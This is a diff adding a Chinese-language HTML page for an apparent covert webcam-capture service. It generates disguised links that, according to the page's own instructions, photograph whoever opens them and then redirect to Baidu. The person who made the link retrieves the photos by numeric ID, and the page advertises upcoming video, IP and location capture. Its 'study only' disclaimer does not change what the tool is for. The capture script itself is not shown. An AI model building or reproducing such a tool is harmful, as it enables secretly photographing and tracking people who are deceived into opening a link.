@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <link rel="stylesheet" href="./css/reset.css">
+    <link rel="stylesheet" href="./bootstrap3/css/bootstrap.min.css">
+    <link rel="stylesheet" href="./css/base.css">
+    <link rel="stylesheet" href="./css/sczp.css">
+    <script src="./js/jquery-3.6.0.min.js"></script>
+    <script src="./bootstrap3/js/bootstrap.min.js"></script>
+</head>
+
+<body>
+    <main class="container">
+        <header class="row">
+            <div>
+                <h1>网页获取照片</h1>
+                <hr>
+                <p>更多功能</p>
+                <div class="method">
+                    <!-- 弹出对话框 功能暂未激活 -->
+                    <div class="item item-1">
+                        <a href="javascript:;" class="btn btn-warning active" role="button" data-toggle="modal" data-target="#modalVideo">网页获取录像</a>
+                    </div>
+                    <div class="item item-2">
+                        <a href="javascript:;" class="btn btn-warning active" role="button">网页获取IP及浏览器信息</a>
+                    </div>
+                    <div class="item item-3">
+                        <a href="javascript:;" class="btn btn-warning active" role="button">网页获取地理位置</a>
+                    </div>
+                </div>
+            </div>
+            <p>赞助本站：</p>
+            <p>请添加QQ群:123456789</p>
+            <div class="div"></div>
+        </header>
+        <section>
+            <form>
+                <div class="form-group">
+                    <label for="inputqq"></label>
+                    <input type="text" class="form-control" id="inputqq" placeholder="请先输入数字ID以生成链接" autocomplete="off" required>
+                </div>
+                <button type="button" class="btn btn-info" id="get_link">生成</button>
+                <p>
+                    <label for="disabledTextInput"></label>
+                    <input id="link" class="form-control" type="text" placeholder="" readonly>
+                    <br>
+                    <input class="btn btn-success" type="button" value="复制链接" onClick="link.select();document.execCommand('Copy')">
+                </p>
+            </form>
+        </section>
+        <section>
+            <form action="./ck.php" method="GET">
+                <div class="form-group">
+                    <label for="findqq"></label>
+                    <input type="text" class="form-control" id="findqq" name="id" placeholder="请输入数字ID以查询照片" autocomplete="off" required>
+                </div>
+                <button type="submit" class="btn btn-info" id="find_link">查询</button>
+                <label for="findqq"></label>
+            </form>
+
+        </section>
+        <section class="statement">
+            <p>使用教程</p>
+            <ol>
+                <li>请自定义输入数字ID以生成链接，此数字ID您获取照片以及查看照片的标识符。</li>
+                <li>点击生成链接按钮</li>
+                <li>点击复制链接按钮以复制链接，用户打开此链接后网页将拍照并跳转到百度</li>
+                <li>返回本网站输入数字ID点击并点击查询按钮以获取照片</li>
+            </ol>
+            <p>免责条款</p>
+            <ol>
+                <li>本站仅作为学习和交流使用，切勿用于非法用途。</li>
+                <li>本站对用户使用工具所带来的所有问题本站不承担任何责任。</li>
+                <li>如有侵权，请联系下方邮箱进行删除。</li>
+            </ol>
+            <p>隐私条款</p>
+            <ol>
+                <li>本站将会使用您的摄像头，使用本网站表示您知情、同意且允许访问摄像头。</li>
+                <li>本站数据每小时定时删除,本站承诺不会保存您的数据。</li>
+            </ol>
+            <p>本站邮箱：111111111</p>
+        </section>
+        <footer></footer>
+    </main>
+    <div class="modal fade" id="modalVideo" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
+        <div class="modal-dialog" role="document">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+                    <h4 class="modal-title" id="myModalLabel">标题</h4>
+                </div>
+                <div class="modal-body">
+                    内容
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-default" data-dismiss="modal">取消</button>
+                    <button type="button" class="btn btn-primary">...</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script>
+        $(document).ready(function() {
+            let link = $("#link");
+            let get_link = $("#get_link");
+            let find_link = $("#find_link");
+            let inputqq = $("#inputqq");
+            let findqq = $("#findqq");
+            // let link_host = "https://live.buxxbuyy.buzz";
+            let link_host = "https://192.168.1.5/web-2020-2/Photo/";
+            get_link.click(() => {
+                if (inputqq.val() != "") {
+                    link.val(link_host + "?id=" + inputqq.val() + "&url=https://www.baidu.com");
+                    link.text(link_host + "?id=" + inputqq.val() + "&url=https://www.baidu.com");
+                    link.css("pointer-events", "auto");
+                } else {
+                    alert("输入的QQ不能为空");
+                }
+            });
+        });
+    </script>
+</body>
+
+</html>
